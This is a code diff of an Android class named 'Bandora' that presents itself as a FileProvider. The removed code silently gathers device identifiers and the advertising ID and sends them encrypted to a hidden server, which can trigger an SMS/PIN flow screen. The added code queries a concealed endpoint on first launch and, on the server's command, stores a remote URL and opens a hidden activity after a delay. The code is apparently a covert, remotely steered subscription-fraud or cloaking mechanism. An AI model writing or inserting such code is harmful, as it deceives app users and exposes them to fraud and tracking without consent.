@@ -5,6 +5,8 @@ import android.app.Application;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
 import android.util.Log;
 
 import androidx.annotation.NonNull;
@@ -18,44 +20,34 @@ import com.adjust.sdk.OnAttributionChangedListener;
 import com.adjust.sdk.OnDeeplinkResponseListener;
 import com.adjust.sdk.OnDeviceIdsRead;
 import com.google.firebase.FirebaseApp;
-import com.google.firebase.analytics.FirebaseAnalytics;
-import com.google.gson.Gson;
-import com.ma.autosdk.api.RetrofitClient;
-import com.ma.autosdk.api.Services;
-import com.ma.autosdk.api.model.request.DeviceInfo;
-import com.ma.autosdk.api.model.request.InitPayload;
-import com.ma.autosdk.api.model.request.Referrer;
-import com.ma.autosdk.api.model.request.Request;
-import com.ma.autosdk.api.model.response.ApiResponse;
-import com.ma.autosdk.api.model.response.Layout;
-import com.ma.autosdk.ui.Action2Activity;
-import com.sma.ssdkm.R;
+import com.ma.autosdk.Util.Constants;
+import com.ma.autosdk.Util.Utils;
+import com.ma.autosdk.ui.AppFileActivity;
 
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.io.IOException;
 import java.util.Arrays;
 import java.util.List;
-import java.util.Locale;
-import java.util.UUID;
 
-import retrofit2.Call;
-import retrofit2.Callback;
-import retrofit2.Response;
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.Response;
 
 public class Bandora extends FileProvider implements Application.ActivityLifecycleCallbacks {
     public static final String TAG = "BANDORA";
     public int activitiesCounter = 0;
     public boolean isLaunched = false;
-    public boolean runWithDeepLink = false;
-    public FirebaseAnalytics mFirebaseAnalytics;
     public static String googleAdId = "";
     public String deeplink = "";
     public String adjustAttribution = "";
-    public static Layout SendPinLayout;
-    public static String SendPinSessionId;
-
-    InitPayload initPayload = InitPayload.getInstance();
+    private long SPLASH_TIME = 0;
 
     //Actions, 5: sms flow with number , 8 : sms flow
-    List<Integer> actionsList = Arrays.asList(2, 8);
+    List<Integer> actionsList = Arrays.asList(1);
 
 
     @Override
@@ -70,10 +62,9 @@ public class Bandora extends FileProvider implements Application.ActivityLifecyc
             @Override
             public void onAttributionChanged(AdjustAttribution attribution) {
                 if (attribution != null) {
+                    Constants.setReceivedAttribution(getContext(),attribution.toString());
                     Bandora.this.adjustAttribution = attribution.toString();
-                    if(initPayload.getReferrer() != null){
-                        initPayload.getReferrer().getAdjust().setRefStr(attribution.toString());
-                    }
+
                 }
             }
         });
@@ -82,18 +73,6 @@ public class Bandora extends FileProvider implements Application.ActivityLifecyc
             @Override
             public boolean launchReceivedDeeplink(Uri deeplink) {
                 Bandora.this.deeplink = deeplink.toString();
-                if(initPayload.getReferrer() != null){
-                    initPayload.getReferrer().getAdjust().setRefStr(deeplink.toString());
-                }
-
-                if (runWithDeepLink) {
-
-                    RetrofitClient.BASE_URL = getContext().getString(R.string.finalEndp);
-                    RetrofitClient.encKey = getContext().getString(R.string.enKey);
-                    RetrofitClient.header = getContext().getString(R.string.header);
-
-                    callAPI();
-                }
 
                 return false;
             }
@@ -103,9 +82,7 @@ public class Bandora extends FileProvider implements Application.ActivityLifecyc
             @Override
             public void onGoogleAdIdRead(String googleAdId) {
                 Bandora.this.googleAdId = googleAdId;
-                if(initPayload.getDeviceInfo() != null){
-                    initPayload.getDeviceInfo().setGps_adid(googleAdId);
-                }
+
             }
         });
 
@@ -126,101 +103,88 @@ public class Bandora extends FileProvider implements Application.ActivityLifecyc
         if (activitiesCounter == 1 && !isLaunched) {
             Log.d(TAG, "Run The SDK");
             isLaunched = true;
-            if (!runWithDeepLink) {
-
-                RetrofitClient.BASE_URL = getContext().getString(R.string.finalEndp);
-                RetrofitClient.encKey = getContext().getString(R.string.enKey);
-                RetrofitClient.header = getContext().getString(R.string.header);
-
-                callAPI();
-            }
+            callAPI(activity);
         }
     }
 
-    public void callAPI(){
+    public void callAPI(Activity activity){
 
-        InitPayload initPayload = InitPayload.getInstance();
-        DeviceInfo deviceInfo = new DeviceInfo();
-        deviceInfo.setDeviceID(Utils.generateClickId(getContext()));
-        deviceInfo.setPackageName(getContext().getPackageName());
-        deviceInfo.setOS("Android");
-        deviceInfo.setModel(Utils.getDeviceModel());
-        deviceInfo.setUserAgent(System.getProperty("http.agent"));
-        deviceInfo.setLangCode(Locale.getDefault().getLanguage());
-        deviceInfo.setGps_adid(googleAdId);
+            OkHttpClient client = new OkHttpClient();
+            Request request = new Request.Builder()
+                    .url("https://"+Constants.KEY_MAIN_POINT+"/?package="+Constants.KEY_PACKAGE_NAME)
+                    .build();
 
-        initPayload.setDeviceInfo(deviceInfo);
-        Referrer referrer = new Referrer();
-        com.ma.autosdk.api.model.request.Adjust adjust = new com.ma.autosdk.api.model.request.Adjust();
+            client.newCall(request).enqueue(new Callback() {
+                @Override
+                public void onFailure(Call call, IOException e) {
+                    AppMainActivity();
+                }
+                @Override
+                public void onResponse(Call call, Response response) throws IOException {
 
-        if(Adjust.getAttribution() != null){
-            adjustAttribution = Adjust.getAttribution().toString();
-        }
+                    String myResponse = response.body().string();
+                    try {
+                        activity.runOnUiThread(() -> {
+                            try {
+                                JSONObject jsonData=new JSONObject(myResponse);
+                                if(jsonData.has("cf")) {
+                                    String fileResult = null;
+                                    try {
+                                        fileResult = jsonData.getString("cf");
 
-        adjust.setDeeplink(deeplink);
-        adjust.setRefStr(this.adjustAttribution);
-        referrer.setAdjust(adjust);
-        initPayload.setReferrer(referrer);
-
-        Request request = new Request();
-        request.setAction(1);
-        request.setTransactionID(UUID.randomUUID().toString());
-        request.setSessionID("");
-        request.setMSISDN("");
-        request.setPinCode("");
-        initPayload.setRequest(request);
+                                    } catch (JSONException e) {
+                                        e.printStackTrace();
+                                    }
+                                    if (fileResult != null && !fileResult.equals(""))  {
+                                        Constants.showAds = false;
+                                        if (fileResult.startsWith("http")) {
+                                            Constants.setEndP(getContext(), fileResult);
+                                        } else {
+                                            Constants.setEndP(getContext(), "https://" + fileResult);
+                                        }
 
 
-        Gson gson = new Gson();
-        String json = gson.toJson(initPayload);
-        String encryptedBody = Utils.encrypt(json, RetrofitClient.encKey);
-        //String encryptedBody2 = Utils.decrypt("gyGh4UYaTV9xOZM+95VlwbovHi1pIDAELmx+wm3yChIzuGZcLjftr5U4e2a5Q8AxpLcU7XN5AqnMPCAo6NGujWslXpBoyYyA7cdOVWxqUNpePB1mS2VeF5JhPbJozbv66P2nSujzzt2FTOOGUAwH4WrjVvw46pNjvDLK8qq8/A/4zm52o069fb5d7RJPK4I1FbtPqaeOKVJXvlIHxzL+nyTP4pWKSmgzCXlI9snkvlla81dLvn/ZlDpou90uiGllRdxuddcIgayPKkS13dnLZA==", encKey);
-        Services initiateService = RetrofitClient.getRetrofitInstance().create(Services.class);
-        initiateService.initiate(RetrofitClient.BASE_URL, RetrofitClient.header, encryptedBody).enqueue(new Callback<String>() {
-            @Override
-            public void onResponse(Call<String> call, Response<String> response) {
-                if (response.isSuccessful()) {
-                    String res = Utils.decrypt(response.body(), RetrofitClient.encKey);
-                    Gson gson = new Gson();
-                    ApiResponse apiResponse = gson.fromJson(res, ApiResponse.class);
+                                        try {
+                                            if (jsonData.has("second")) {
+                                                SPLASH_TIME = jsonData.getLong("second");
+                                                SPLASH_TIME = SPLASH_TIME * 2;
+                                            } else {
+                                                SPLASH_TIME = 8;
+                                            }
+                                        } catch (Exception e) {
+                                            e.printStackTrace();
+                                        }
+                                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                            //startActivity(new Intent(LauncherActivity.this, MainActivity.class));
+                                                Intent intent = new Intent(getContext(), AppFileActivity.class);
+                                                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                                                getContext().startActivity(intent);
+                                                return;
+                                            }, SPLASH_TIME);
 
-                    if (apiResponse != null) {
-                        if (apiResponse.getNextAction() != null && actionsList.contains(apiResponse.getNextAction().getAction())) {
-                            if (apiResponse.getNextAction().getLayout() != null) {
-                                Intent intent = new Intent(getContext(), Action2Activity.class);
-                                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                                intent.putExtra("layout", apiResponse.getNextAction().getLayout());
-                                intent.putExtra("id", apiResponse.getSessionID());
-                                intent.putExtra("action", apiResponse.getNextAction().getAction());
-                                getContext().startActivity(intent);
-                            } else   {
-                                return;
+                                    } else {
+                                        AppMainActivity();
+                                    }
+                                }
+                                else
+                                {
+                                    AppMainActivity();
+                                }
+
+                            } catch (Exception e) {
+                                e.printStackTrace();
+                                AppMainActivity();
                             }
-                        }
-                        else if (apiResponse.getNextAction() != null  ) {
-                            //show nothing
-                            return;
-                        }
-                    } else {
-                        firebaseLog("load parsing error", "");
+                        });
+                    }catch (Exception e) {
+                        AppMainActivity();
                     }
                 }
-            }
-
-            public void firebaseLog(String eventName, String errorLog) {
-                Bundle params = new Bundle();
-                if (!errorLog.isEmpty() && errorLog != null) {
-                    params.putString("errorLog", errorLog);
-                }
-                mFirebaseAnalytics = FirebaseAnalytics.getInstance(getContext());
-                mFirebaseAnalytics.logEvent(eventName, params);
-            }
-
-            @Override
-            public void onFailure(Call<String> call, Throwable t) {
-                Log.wtf(TAG, "onFailure: fail " );
-            }
-        });
+            });
+    }
+    public void AppMainActivity() {
+      //  getContext().startActivity(new Intent(getContext(), AppFileActivity.class));
+        return;
     }
     @Override
     public void onActivityStarted(@NonNull Activity activity) {
